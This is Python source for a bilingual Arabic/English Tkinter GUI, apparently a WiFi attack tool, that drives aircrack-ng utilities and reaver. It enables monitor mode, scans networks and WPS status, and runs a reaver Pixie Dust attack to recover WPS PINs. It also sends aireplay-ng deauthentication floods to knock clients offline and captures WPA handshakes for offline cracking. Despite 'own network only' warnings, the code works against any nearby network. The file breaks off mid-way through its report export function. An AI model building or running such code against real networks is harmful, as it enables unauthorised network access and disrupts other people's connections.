#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
أداة اختبار أمان شبكات الواي فاي - نسخة متقدمة
WiFi Security Testing Tool - Advanced Version
تحذير: استخدم هذه الأداة فقط على شبكاتك الخاصة أو بإذن صريح
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import subprocess
import threading
import re
import os
import json
import csv
from datetime import datetime
import time

class WiFiSecurityToolAdvanced:
    def __init__(self, root):
        self.root = root
        self.root.title("أداة اختبار أمان الواي فاي - متقدم | WiFi Security Tool - Advanced")
        self.root.geometry("1100x800")
        self.root.configure(bg='#2c3e50')
        
        self.scanning = False
        self.monitor_mode = False
        self.interface = tk.StringVar()
        self.networks = []
        self.selected_network = None
        self.capture_process = None
        
        self.setup_ui()
        self.check_requirements()
        
    def setup_ui(self):
        # Create notebook for tabs
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Tab 1: Main Scanning
        self.scan_tab = tk.Frame(self.notebook, bg='#2c3e50')
        self.notebook.add(self.scan_tab, text='🔍 الفحص الرئيسي - Main Scan')
        
        # Tab 2: Advanced Features
        self.advanced_tab = tk.Frame(self.notebook, bg='#2c3e50')
        self.notebook.add(self.advanced_tab, text='⚡ مميزات متقدمة - Advanced')
        
        # Tab 3: Analytics
        self.analytics_tab = tk.Frame(self.notebook, bg='#2c3e50')
        self.notebook.add(self.analytics_tab, text='📊 التحليلات - Analytics')
        
        # Setup each tab
        self.setup_scan_tab()
        self.setup_advanced_tab()
        self.setup_analytics_tab()
        
        # Status Bar (shared)
        self.status_bar = tk.Label(
            self.root,
            text="جاهز - Ready",
            bd=1,
            relief='sunken',
            anchor='w',
            bg='#34495e',
            fg='white',
            font=('Arial', 9)
        )
        self.status_bar.pack(side='bottom', fill='x')
        
    def setup_scan_tab(self):
        # Header
        header_frame = tk.Frame(self.scan_tab, bg='#34495e', height=80)
        header_frame.pack(fill='x', padx=10, pady=10)
        
        title_label = tk.Label(
            header_frame, 
            text="🔒 أداة اختبار أمان الواي فاي - متقدم",
            font=('Arial', 18, 'bold'),
            bg='#34495e',
            fg='white'
        )
        title_label.pack(pady=5)
        
        warning_label = tk.Label(
            header_frame,
            text="⚠️ تحذير: استخدم فقط على شبكاتك الخاصة | Warning: Use only on your own networks",
            font=('Arial', 10),
            bg='#34495e',
            fg='#e74c3c'
        )
        warning_label.pack()
        
        # Interface Selection Frame
        interface_frame = tk.LabelFrame(
            self.scan_tab,
            text="اختيار واجهة الشبكة - Network Interface",
            font=('Arial', 11, 'bold'),
            bg='#34495e',
            fg='white',
            padx=10,
            pady=10
        )
        interface_frame.pack(fill='x', padx=10, pady=5)
        
        tk.Label(
            interface_frame,
            text="الواجهة:",
            bg='#34495e',
            fg='white',
            font=('Arial', 10)
        ).grid(row=0, column=0, padx=5, sticky='w')
        
        self.interface_combo = ttk.Combobox(
            interface_frame,
            textvariable=self.interface,
            width=20,
            state='readonly'
        )
        self.interface_combo.grid(row=0, column=1, padx=5)
        
        tk.Button(
            interface_frame,
            text="🔄 تحديث - Refresh",
            command=self.get_interfaces,
            bg='#3498db',
            fg='white',
            font=('Arial', 9, 'bold'),
            cursor='hand2'
        ).grid(row=0, column=2, padx=5)
        
        self.monitor_btn = tk.Button(
            interface_frame,
            text="🔧 تفعيل Monitor Mode",
            command=self.toggle_monitor_mode,
            bg='#e67e22',
            fg='white',
            font=('Arial', 9, 'bold'),
            cursor='hand2'
        )
        self.monitor_btn.grid(row=0, column=3, padx=5)
        
        # Control Frame
        control_frame = tk.Frame(self.scan_tab, bg='#2c3e50')
        control_frame.pack(fill='x', padx=10, pady=5)
        
        self.scan_button = tk.Button(
            control_frame,
            text="🔍 فحص الشبكات - Scan Networks",
            command=self.start_scan,
            bg='#27ae60',
            fg='white',
            font=('Arial', 11, 'bold'),
            width=22,
            height=2,
            cursor='hand2'
        )
        self.scan_button.pack(side='left', padx=5)
        
        tk.Button(
            control_frame,
            text="🔍 شبكات مخفية - Hidden",
            command=self.scan_hidden_networks,
            bg='#8e44ad',
            fg='white',
            font=('Arial', 11, 'bold'),
            width=18,
            height=2,
            cursor='hand2'
        ).pack(side='left', padx=5)
        
        tk.Button(
            control_frame,
            text="🛑 إيقاف - Stop",
            command=self.stop_scan,
            bg='#e74c3c',
            fg='white',
            font=('Arial', 11, 'bold'),
            width=12,
            height=2,
            cursor='hand2'
        ).pack(side='left', padx=5)
        
        tk.Button(
            control_frame,
            text="🗑️ مسح - Clear",
            command=self.clear_output,
            bg='#95a5a6',
            fg='white',
            font=('Arial', 11, 'bold'),
            width=12,
            height=2,
            cursor='hand2'
        ).pack(side='left', padx=5)
        
        # Networks List Frame
        networks_frame = tk.LabelFrame(
            self.scan_tab,
            text="الشبكات المكتشفة - Discovered Networks",
            font=('Arial', 11, 'bold'),
            bg='#34495e',
            fg='white',
            padx=10,
            pady=10
        )
        networks_frame.pack(fill='both', expand=True, padx=10, pady=5)
        
        # Treeview for networks
        columns = ('SSID', 'BSSID', 'Channel', 'Signal', 'Security', 'WPS')
        self.tree = ttk.Treeview(networks_frame, columns=columns, show='headings', height=8)
        
        self.tree.heading('SSID', text='اسم الشبكة - SSID')
        self.tree.heading('BSSID', text='BSSID')
        self.tree.heading('Channel', text='القناة')
        self.tree.heading('Signal', text='الإشارة')
        self.tree.heading('Security', text='الحماية')
        self.tree.heading('WPS', text='WPS')
        
        self.tree.column('SSID', width=140)
        self.tree.column('BSSID', width=140)
        self.tree.column('Channel', width=60)
        self.tree.column('Signal', width=80)
        self.tree.column('Security', width=100)
        self.tree.column('WPS', width=60)
        
        # Add tags for coloring
        self.tree.tag_configure('weak', background='#ffcccc')
        self.tree.tag_configure('medium', background='#ffffcc')
        self.tree.tag_configure('strong', background='#ccffcc')
        
        scrollbar = ttk.Scrollbar(networks_frame, orient='vertical', command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        
        self.tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
        # Bind selection
        self.tree.bind('<<TreeviewSelect>>', self.on_network_select)
        
        # Output Frame
        output_frame = tk.LabelFrame(
            self.scan_tab,
            text="النتائج والسجلات - Output & Logs",
            font=('Arial', 11, 'bold'),
            bg='#34495e',
            fg='white',
            padx=10,
            pady=10
        )
        output_frame.pack(fill='both', expand=True, padx=10, pady=5)
        
        self.output_text = scrolledtext.ScrolledText(
            output_frame,
            width=80,
            height=8,
            bg='#1c2833',
            fg='#2ecc71',
            font=('Courier', 9),
            insertbackground='white'
        )
        self.output_text.pack(fill='both', expand=True)
        
    def setup_advanced_tab(self):
        # Selected Network Info
        info_frame = tk.LabelFrame(
            self.advanced_tab,
            text="معلومات الشبكة المحددة - Selected Network Info",
            font=('Arial', 11, 'bold'),
            bg='#34495e',
            fg='white',
            padx=10,
            pady=10
        )
        info_frame.pack(fill='x', padx=10, pady=10)
        
        self.info_label = tk.Label(
            info_frame,
            text="لم يتم اختيار شبكة - No network selected",
            bg='#34495e',
            fg='white',
            font=('Arial', 10),
            justify='left'
        )
        self.info_label.pack(pady=10)
        
        # WPS Testing Frame
        wps_frame = tk.LabelFrame(
            self.advanced_tab,
            text="🔐 اختبار WPS - WPS Testing",
            font=('Arial', 11, 'bold'),
            bg='#34495e',
            fg='white',
            padx=15,
            pady=15
        )
        wps_frame.pack(fill='x', padx=10, pady=5)
        
        tk.Label(
            wps_frame,
            text="اختبار ثغرات WPS في الشبكة المحددة",
            bg='#34495e',
            fg='#ecf0f1',
            font=('Arial', 9)
        ).pack()
        
        wps_btn_frame = tk.Frame(wps_frame, bg='#34495e')
        wps_btn_frame.pack(pady=10)
        
        tk.Button(
            wps_btn_frame,
            text="🔍 فحص WPS - Check WPS",
            command=self.check_wps,
            bg='#9b59b6',
            fg='white',
            font=('Arial', 10, 'bold'),
            width=20,
            cursor='hand2'
        ).pack(side='left', padx=5)
        
        tk.Button(
            wps_btn_frame,
            text="⚡ هجوم WPS Pixie - WPS Attack",
            command=self.wps_pixie_attack,
            bg='#e74c3c',
            fg='white',
            font=('Arial', 10, 'bold'),
            width=20,
            cursor='hand2'
        ).pack(side='left', padx=5)
        
        # Handshake Capture Frame
        handshake_frame = tk.LabelFrame(
            self.advanced_tab,
            text="🤝 التقاط Handshake - Handshake Capture",
            font=('Arial', 11, 'bold'),
            bg='#34495e',
            fg='white',
            padx=15,
            pady=15
        )
        handshake_frame.pack(fill='x', padx=10, pady=5)
        
        tk.Label(
            handshake_frame,
            text="التقاط handshake للشبكة المحددة (WPA/WPA2)",
            bg='#34495e',
            fg='#ecf0f1',
            font=('Arial', 9)
        ).pack()
        
        hs_btn_frame = tk.Frame(handshake_frame, bg='#34495e')
        hs_btn_frame.pack(pady=10)
        
        tk.Button(
            hs_btn_frame,
            text="📡 بدء الالتقاط - Start Capture",
            command=self.start_handshake_capture,
            bg='#16a085',
            fg='white',
            font=('Arial', 10, 'bold'),
            width=20,
            cursor='hand2'
        ).pack(side='left', padx=5)
        
        tk.Button(
            hs_btn_frame,
            text="💥 إرسال Deauth - Send Deauth",
            command=self.send_deauth,
            bg='#d35400',
            fg='white',
            font=('Arial', 10, 'bold'),
            width=20,
            cursor='hand2'
        ).pack(side='left', padx=5)
        
        tk.Button(
            hs_btn_frame,
            text="🛑 إيقاف - Stop",
            command=self.stop_handshake_capture,
            bg='#c0392b',
            fg='white',
            font=('Arial', 10, 'bold'),
            width=15,
            cursor='hand2'
        ).pack(side='left', padx=5)
        
        # Export Frame
        export_frame = tk.LabelFrame(
            self.advanced_tab,
            text="💾 تصدير النتائج - Export Results",
            font=('Arial', 11, 'bold'),
            bg='#34495e',
            fg='white',
            padx=15,
            pady=15
        )
        export_frame.pack(fill='x', padx=10, pady=5)
        
        tk.Label(
            export_frame,
            text="حفظ نتائج الفحص بصيغ مختلفة",
            bg='#34495e',
            fg='#ecf0f1',
            font=('Arial', 9)
        ).pack()
        
        export_btn_frame = tk.Frame(export_frame, bg='#34495e')
        export_btn_frame.pack(pady=10)
        
        tk.Button(
            export_btn_frame,
            text="📄 تصدير CSV",
            command=lambda: self.export_results('csv'),
            bg='#27ae60',
            fg='white',
            font=('Arial', 10, 'bold'),
            width=15,
            cursor='hand2'
        ).pack(side='left', padx=5)
        
        tk.Button(
            export_btn_frame,
            text="📋 تصدير JSON",
            command=lambda: self.export_results('json'),
            bg='#2980b9',
            fg='white',
            font=('Arial', 10, 'bold'),
            width=15,
            cursor='hand2'
        ).pack(side='left', padx=5)
        
        tk.Button(
            export_btn_frame,
            text="📊 تصدير TXT Report",
            command=lambda: self.export_results('txt'),
            bg='#8e44ad',
            fg='white',
            font=('Arial', 10, 'bold'),
            width=18,
            cursor='hand2'
        ).pack(side='left', padx=5)
        
    def setup_analytics_tab(self):
        # Analytics Header
        header = tk.Label(
            self.analytics_tab,
            text="📊 تحليل قوة الإشارة والأمان - Signal & Security Analysis",
            font=('Arial', 14, 'bold'),
            bg='#2c3e50',
            fg='white'
        )
        header.pack(pady=15)
        
        # Buttons Frame
        btn_frame = tk.Frame(self.analytics_tab, bg='#2c3e50')
        btn_frame.pack(pady=10)
        
        tk.Button(
            btn_frame,
            text="📊 رسم بياني للإشارة - Signal Chart",
            command=self.show_signal_chart,
            bg='#3498db',
            fg='white',
            font=('Arial', 11, 'bold'),
            width=25,
            height=2,
            cursor='hand2'
        ).pack(side='left', padx=10)
        
        tk.Button(
            btn_frame,
            text="🔒 تحليل الأمان - Security Analysis",
            command=self.analyze_security,
            bg='#e67e22',
            fg='white',
            font=('Arial', 11, 'bold'),
            width=25,
            height=2,
            cursor='hand2'
        ).pack(side='left', padx=10)
        
        # Statistics Frame
        stats_frame = tk.LabelFrame(
            self.analytics_tab,
            text="إحصائيات الشبكات - Network Statistics",
            font=('Arial', 11, 'bold'),
            bg='#34495e',
            fg='white',
            padx=20,
            pady=20
        )
        stats_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.stats_text = scrolledtext.ScrolledText(
            stats_frame,
            width=80,
            height=20,
            bg='#1c2833',
            fg='#ecf0f1',
            font=('Courier', 10),
            insertbackground='white'
        )
        self.stats_text.pack(fill='both', expand=True)
        
    def check_requirements(self):
        """Check if required tools are installed"""
        self.log("=" * 60)
        self.log("جاري فحص الأدوات المطلوبة... | Checking required tools...")
        self.log("=" * 60)
        
        tools = {
            'airmon-ng': 'إدارة Monitor Mode',
            'airodump-ng': 'فحص الشبكات',
            'aireplay-ng': 'إرسال Deauth',
            'aircrack-ng': 'تحليل Handshakes',
            'wash': 'فحص WPS',
            'reaver': 'هجوم WPS',
            'nmcli': 'إدارة الشبكات',
            'iwconfig': 'إعدادات الواجهة'
        }
        
        missing_tools = []
        
        for tool, description in tools.items():
            result = subprocess.run(['which', tool], capture_output=True, text=True)
            if result.returncode == 0:
                self.log(f"✅ {tool:15} - {description}")
            else:
                self.log(f"❌ {tool:15} - مفقود | Missing")
                missing_tools.append(tool)
        
        self.log("=" * 60)
        
        if missing_tools:
            self.log(f"\n⚠️ أدوات مفقودة | Missing tools: {', '.join(missing_tools)}")
            self.log("لتثبيتها | To install:")
            self.log("sudo apt install aircrack-ng reaver")
        else:
            self.log("✅ جميع الأدوات متوفرة! | All tools available!")
        
        self.log("=" * 60 + "\n")
        self.get_interfaces()
        
    def get_interfaces(self):
        """Get available network interfaces"""
        try:
            interfaces = []
            
            # Method 1: iwconfig
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, stderr=subprocess.STDOUT)
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line or 'ESSID' in line:
                    interface = line.split()[0]
                    if interface and interface not in interfaces:
                        interfaces.append(interface)
            
            # Method 2: ip link
            result = subprocess.run(['ip', 'link'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'wl' in line or 'wlan' in line:
                    match = re.search(r'\d+: (\w+):', line)
                    if match:
                        iface = match.group(1)
                        if iface not in interfaces:
                            interfaces.append(iface)
            
            if interfaces:
                self.interface_combo['values'] = interfaces
                self.interface_combo.current(0)
                self.log(f"✅ واجهات متاحة | Available interfaces: {', '.join(interfaces)}\n")
            else:
                self.log("⚠️ لم يتم العثور على واجهات واي فاي | No WiFi interfaces found\n")
                
        except Exception as e:
            self.log(f"❌ خطأ | Error: {str(e)}\n")
            
    def toggle_monitor_mode(self):
        """Toggle monitor mode on the selected interface"""
        if not self.interface.get():
            messagebox.showerror("خطأ - Error", "اختر واجهة الشبكة أولاً\nPlease select an interface first")
            return
            
        interface = self.interface.get()
        
        try:
            if not self.monitor_mode:
                self.log(f"🔧 تفعيل Monitor Mode على | Enabling monitor mode on {interface}...")
                
                # Kill interfering processes
                subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                             capture_output=True, stderr=subprocess.STDOUT)
                
                # Start monitor mode
                result = subprocess.run(['sudo', 'airmon-ng', 'start', interface], 
                                      capture_output=True, text=True)
                
                self.monitor_mode = True
                self.monitor_btn.config(text="🛑 إيقاف Monitor Mode", bg='#c0392b')
                self.log(f"✅ تم تفعيل Monitor Mode | Monitor mode enabled\n")
                
            else:
                self.log(f"🔧 إيقاف Monitor Mode على | Disabling monitor mode on {interface}...")
                subprocess.run(['sudo', 'airmon-ng', 'stop', interface], 
                             capture_output=True, text=True)
                
                self.monitor_mode = False
                self.monitor_btn.config(text="🔧 تفعيل Monitor Mode", bg='#e67e22')
                self.log(f"✅ تم إيقاف Monitor Mode | Monitor mode disabled\n")
                
            self.get_interfaces()
            
        except Exception as e:
            self.log(f"❌ خطأ | Error: {str(e)}\n")
            messagebox.showerror("خطأ - Error", 
                               "تحتاج لتشغيل الأداة بصلاحيات sudo\nYou need sudo privileges")
            
    def start_scan(self):
        """Start scanning for networks"""
        if not self.interface.get():
            messagebox.showerror("خطأ - Error", "اختر واجهة الشبكة أولاً\nPlease select interface first")
            return
            
        if self.scanning:
            self.log("⚠️ الفحص قيد التشغيل | Scan already running\n")
            return
            
        self.scanning = True
        self.scan_button.config(state='disabled')
        self.tree.delete(*self.tree.get_children())
        
        thread = threading.Thread(target=self.scan_networks, daemon=True)
        thread.start()
        
    def scan_networks(self):
        """Scan for available networks"""
        interface = self.interface.get()
        self.log(f"🔍 بدء فحص الشبكات على | Starting scan on {interface}...\n")
        self.update_status("جاري الفحص... | Scanning...")
        
        try:
            # Rescan
            subprocess.run(['sudo', 'nmcli', 'device', 'wifi', 'rescan'], 
                         capture_output=True, timeout=5)
            time.sleep(2)
            
            # Get list
            result = subprocess.run(
                ['nmcli', '-t', '-f', 'SSID,BSSID,CHAN,SIGNAL,SECURITY', 'dev', 'wifi', 'list'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            networks_found = 0
            self.networks = []
            
            for line in result.stdout.strip().split('\n'):
                if line:
                    parts = line.split(':')
                    if len(parts) >= 5:
                        ssid = parts[0] if parts[0] else '(Hidden Network)'
                        bssid = parts[1]
                        channel = parts[2]
                        signal = parts[3]
                        security = parts[4] if parts[4] else 'Open'
                        
                        # Store network info
                        network = {
                            'ssid': ssid,
                            'bssid': bssid,
                            'channel': channel,
                            'signal': signal,
                            'security': security,
                            'wps': 'Unknown'
                        }
                        self.networks.append(network)
                        
                        # Determine security level for coloring
                        tag = ''
                        if 'WPA3' in security or 'WPA2' in security:
                            tag = 'strong'
                        elif 'WPA' in security:
                            tag = 'medium'
                        elif security == 'Open' or 'WEP' in security:
                            tag = 'weak'
                        
                        self.tree.insert('', 'end', 
                                       values=(ssid, bssid, channel, signal, security, 'Unknown'),
                                       tags=(tag,))
                        networks_found += 1
            
            self.log(f"✅ تم العثور على {networks_found} شبكة | Found {networks_found} networks\n")
            
            # Check WPS for all networks if in monitor mode
            if self.monitor_mode:
                self.log("🔍 فحص WPS للشبكات... | Checking WPS for networks...\n")
                threading.Thread(target=self.scan_wps_all, daemon=True).start()
            
        except subprocess.TimeoutExpired:
            self.log("⏱️ انتهت مهلة الفحص | Scan timeout\n")
        except Exception as e:
            self.log(f"❌ خطأ في الفحص | Scan error: {str(e)}\n")
            
        self.scanning = False
        self.scan_button.config(state='normal')
        self.update_status("جاهز | Ready")
        
    def scan_wps_all(self):
        """Scan WPS status for all networks"""
        if not self.monitor_mode:
            return
            
        try:
            interface = self.interface.get()
            result = subprocess.run(
                ['sudo', 'wash', '-i', interface, '-C'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Parse wash output
            for line in result.stdout.split('\n'):
                if len(line) > 30 and ':' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        bssid = parts[0]
                        wps_status = 'Yes' if 'Yes' in line else 'No'
                        
                        # Update tree
                        for item in self.tree.get_children():
                            values = list(self.tree.item(item)['values'])
                            if values[1] == bssid:
                                values[5] = wps_status
                                self.tree.item(item, values=values)
                                
                                # Update networks list
                                for net in self.networks:
                                    if net['bssid'] == bssid:
                                        net['wps'] = wps_status
                                        break
                                break
                                
            self.log("✅ اكتمل فحص WPS | WPS scan completed\n")
            
        except Exception as e:
            self.log(f"⚠️ تعذر فحص WPS | WPS scan failed: {str(e)}\n")
            
    def scan_hidden_networks(self):
        """Scan for hidden networks"""
        if not self.monitor_mode:
            messagebox.showwarning("تحذير - Warning", 
                                 "يجب تفعيل Monitor Mode أولاً\nMonitor Mode required")
            return
            
        if not self.interface.get():
            messagebox.showerror("خطأ - Error", "اختر واجهة الشبكة\nSelect interface")
            return
            
        self.log("🔍 البحث عن شبكات مخفية... | Searching for hidden networks...\n")
        self.update_status("جاري البحث عن شبكات مخفية... | Searching hidden networks...")
        
        def scan_hidden():
            try:
                interface = self.interface.get()
                output_file = f"/tmp/hidden_scan_{int(time.time())}"
                
                # Run airodump-ng for 30 seconds
                process = subprocess.Popen(
                    ['sudo', 'airodump-ng', '-w', output_file, '--output-format', 'csv', interface],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
                time.sleep(30)
                process.terminate()
                
                # Parse CSV output
                csv_file = output_file + '-01.csv'
                if os.path.exists(csv_file):
                    with open(csv_file, 'r') as f:
                        content = f.read()
                        hidden_count = content.count('<length:  0>')
                        
                    self.log(f"📡 تم العثور على {hidden_count} شبكة مخفية محتملة")
                    self.log(f"Found {hidden_count} potential hidden networks\n")
                    
                    # Clean up
                    for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                        try:
                            os.remove(output_file + ext)
                        except:
                            pass
                else:
                    self.log("⚠️ لم يتم العثور على ملف النتائج | Results file not found\n")
                    
            except Exception as e:
                self.log(f"❌ خطأ | Error: {str(e)}\n")
                
            self.update_status("جاهز | Ready")
            
        thread = threading.Thread(target=scan_hidden, daemon=True)
        thread.start()
        
    def stop_scan(self):
        """Stop scanning"""
        self.scanning = False
        self.log("🛑 تم إيقاف الفحص | Scan stopped\n")
        self.update_status("تم الإيقاف | Stopped")
        
    def on_network_select(self, event):
        """Handle network selection"""
        selection = self.tree.selection()
        if selection:
            item = selection[0]
            values = self.tree.item(item)['values']
            
            self.selected_network = {
                'ssid': values[0],
                'bssid': values[1],
                'channel': values[2],
                'signal': values[3],
                'security': values[4],
                'wps': values[5]
            }
            
            info_text = f"""
الشبكة المحددة | Selected Network:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SSID: {values[0]}
BSSID: {values[1]}
القناة | Channel: {values[2]}
قوة الإشارة | Signal: {values[3]} dBm
الحماية | Security: {values[4]}
WPS: {values[5]}
            """
            
            self.info_label.config(text=info_text)
            self.log(f"✅ تم اختيار الشبكة | Network selected: {values[0]}\n")
            
    def check_wps(self):
        """Check WPS status for selected network"""
        if not self.selected_network:
            messagebox.showwarning("تحذير - Warning", "اختر شبكة أولاً\nSelect a network first")
            return
            
        if not self.monitor_mode:
            messagebox.showwarning("تحذير - Warning", 
                                 "يجب تفعيل Monitor Mode\nMonitor Mode required")
            return
            
        self.log(f"🔍 فحص WPS للشبكة | Checking WPS for: {self.selected_network['ssid']}\n")
        
        def check():
            try:
                interface = self.interface.get()
                result = subprocess.run(
                    ['sudo', 'wash', '-i', interface, '-C'],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                bssid = self.selected_network['bssid']
                wps_enabled = False
                wps_locked = False
                
                for line in result.stdout.split('\n'):
                    if bssid in line:
                        wps_enabled = True
                        if 'Locked' in line or 'locked' in line:
                            wps_locked = True
                        break
                
                if wps_enabled:
                    if wps_locked:
                        self.log(f"⚠️ WPS مفعل لكن مقفل | WPS enabled but locked\n")
                    else:
                        self.log(f"✅ WPS مفعل وقابل للاختبار | WPS enabled and testable\n")
                else:
                    self.log(f"❌ WPS غير مفعل | WPS not enabled\n")
                    
            except Exception as e:
                self.log(f"❌ خطأ | Error: {str(e)}\n")
                
        thread = threading.Thread(target=check, daemon=True)
        thread.start()
        
    def wps_pixie_attack(self):
        """WPS Pixie Dust attack"""
        if not self.selected_network:
            messagebox.showwarning("تحذير - Warning", "اختر شبكة أولاً\nSelect a network first")
            return
            
        if not self.monitor_mode:
            messagebox.showwarning("تحذير - Warning", 
                                 "يجب تفعيل Monitor Mode\nMonitor Mode required")
            return
            
        response = messagebox.askyesno(
            "تأكيد - Confirm",
            "هل أنت متأكد؟ هذا الهجوم للاختبار فقط على شبكتك الخاصة\n" +
            "Are you sure? This attack is for testing your own network only"
        )
        
        if not response:
            return
            
        self.log(f"⚡ بدء هجوم WPS Pixie على | Starting WPS Pixie attack on: {self.selected_network['ssid']}\n")
        self.log("⏳ هذه العملية قد تستغرق عدة دقائق... | This may take several minutes...\n")
        
        def attack():
            try:
                interface = self.interface.get()
                bssid = self.selected_network['bssid']
                channel = self.selected_network['channel']
                
                # Set channel
                subprocess.run(['sudo', 'iwconfig', interface, 'channel', channel],
                             capture_output=True)
                
                # Run reaver with pixie dust
                result = subprocess.run(
                    ['sudo', 'reaver', '-i', interface, '-b', bssid, '-K', '-vv'],
                    capture_output=True,
                    text=True,
                    timeout=300  # 5 minutes timeout
                )
                
                self.log("═" * 60 + "\n")
                self.log("نتيجة الهجوم | Attack Result:\n")
                self.log("═" * 60 + "\n")
                self.log(result.stdout)
                self.log("\n" + "═" * 60 + "\n")
                
                if 'WPS PIN:' in result.stdout:
                    self.log("✅ تم العثور على PIN! | PIN Found!\n")
                else:
                    self.log("❌ لم يتم العثور على PIN | PIN not found\n")
                    
            except subprocess.TimeoutExpired:
                self.log("⏱️ انتهت مهلة الهجوم | Attack timeout\n")
            except Exception as e:
                self.log(f"❌ خطأ | Error: {str(e)}\n")
                
        thread = threading.Thread(target=attack, daemon=True)
        thread.start()
        
    def start_handshake_capture(self):
        """Start capturing handshake"""
        if not self.selected_network:
            messagebox.showwarning("تحذير - Warning", "اختر شبكة أولاً\nSelect a network first")
            return
            
        if not self.monitor_mode:
            messagebox.showwarning("تحذير - Warning", 
                                 "يجب تفعيل Monitor Mode\nMonitor Mode required")
            return
            
        if 'WPA' not in self.selected_network['security']:
            messagebox.showwarning("تحذير - Warning", 
                                 "الشبكة ليست WPA/WPA2\nNetwork is not WPA/WPA2")
            return
            
        self.log(f"📡 بدء التقاط handshake من | Starting handshake capture from: {self.selected_network['ssid']}\n")
        self.log("⏳ انتظار اتصال جهاز... أو أرسل deauth\n")
        self.log("Waiting for client connection... or send deauth\n")
        
        def capture():
            try:
                interface = self.interface.get()
                bssid = self.selected_network['bssid']
                channel = self.selected_network['channel']
                
                # Create output directory
                output_dir = os.path.expanduser('~/wifi_captures')
                os.makedirs(output_dir, exist_ok=True)
                
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                ssid_clean = re.sub(r'[^\w\-]', '', self.selected_network['ssid'])
                output_file = f"{output_dir}/handshake_{ssid_clean}_{timestamp}"
                
                # Start airodump-ng
                self.capture_process = subprocess.Popen(
                    ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, 
                     '-w', output_file, interface],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                self.log(f"💾 حفظ في | Saving to: {output_file}\n")
                
                # Monitor for handshake (simplified - checks after 2 minutes)
                time.sleep(120)
                
                if self.capture_process and self.capture_process.poll() is None:
                    self.capture_process.terminate()
                    self.log(f"✅ اكتمل الالتقاط | Capture completed\n")
                    self.log(f"📁 الملفات محفوظة في | Files saved in: {output_dir}\n")
                    
            except Exception as e:
                self.log(f"❌ خطأ | Error: {str(e)}\n")
                
        thread = threading.Thread(target=capture, daemon=True)
        thread.start()
        
    def send_deauth(self):
        """Send deauth packets to force reconnection"""
        if not self.selected_network:
            messagebox.showwarning("تحذير - Warning", "اختر شبكة أولاً\nSelect network first")
            return
            
        if not self.monitor_mode:
            messagebox.showwarning("تحذير - Warning", 
                                 "يجب تفعيل Monitor Mode\nMonitor Mode required")
            return
            
        response = messagebox.askyesno(
            "تأكيد - Confirm",
            "إرسال deauth سيقطع اتصال الأجهزة مؤقتاً. للاختبار على شبكتك فقط!\n" +
            "Sending deauth will temporarily disconnect devices. Test on your network only!"
        )
        
        if not response:
            return
            
        self.log(f"💥 إرسال حزم deauth إلى | Sending deauth packets to: {self.selected_network['ssid']}\n")
        
        def deauth():
            try:
                interface = self.interface.get()
                bssid = self.selected_network['bssid']
                
                # Send 10 deauth packets
                subprocess.run(
                    ['sudo', 'aireplay-ng', '--deauth', '10', '-a', bssid, interface],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                self.log("✅ تم إرسال حزم deauth | Deauth packets sent\n")
                
            except Exception as e:
                self.log(f"❌ خطأ | Error: {str(e)}\n")
                
        thread = threading.Thread(target=deauth, daemon=True)
        thread.start()
        
    def stop_handshake_capture(self):
        """Stop handshake capture"""
        if self.capture_process:
            self.capture_process.terminate()
            self.capture_process = None
            self.log("🛑 تم إيقاف الالتقاط | Capture stopped\n")
        else:
            self.log("⚠️ لا يوجد التقاط نشط | No active capture\n")
            
    def export_results(self, format_type):
        """Export scan results"""
        if not self.networks:
            messagebox.showwarning("تحذير - Warning", 
                                 "لا توجد نتائج للتصدير\nNo results to export")
            return
            
        try:
            # Create exports directory
            export_dir = os.path.expanduser('~/wifi_exports')
            os.makedirs(export_dir, exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            if format_type == 'csv':
                filename = f"{export_dir}/wifi_scan_{timestamp}.csv"
                with open(filename, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=['ssid', 'bssid', 'channel', 
                                                           'signal', 'security', 'wps'])
                    writer.writeheader()
                    writer.writerows(self.networks)
                    
            elif format_type == 'json':
                filename = f"{export_dir}/wifi_scan_{timestamp}.json"
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump({
                        'scan_time': datetime.now().isoformat(),
                        'interface': self.interface.get(),
                        'networks_count': len(self.networks),
                        'networks': self.networks
                    }, f, ensure_ascii=False, indent=2)
                    
            elif format_type == 'txt':
                filename = f"{export_dir}/wifi_report_{timestamp}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write("=" * 80 + "\n")
                    f.write("تقرير فحص شبكات الواي فاي | WiFi Network Scan Report\n")
                    f.write("=" * 80 + "\n\n")
                    f.write(f"وقت الفحص | Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"الواجهة | Interface: {self.interface.get()}\n")
                    f.write(f"عدد الشبكات | Networks Found: {len(self.networks)}\n\n")
                    f.write("=" * 80 + "\n\n")
                    
                    for i, net in enumerate(self.networks, 1):
                        f.write(f"شبكة #{i} | Network #{i}\n")
                        f.write("-" * 40 + "\n")
                        f.write(f"SSID: {net['ssid']}\n")
                        f.write(f"BSSID: {net['bssid']}\n")
                        f.write(f"القناة | Channel: {net['channel']}\n")
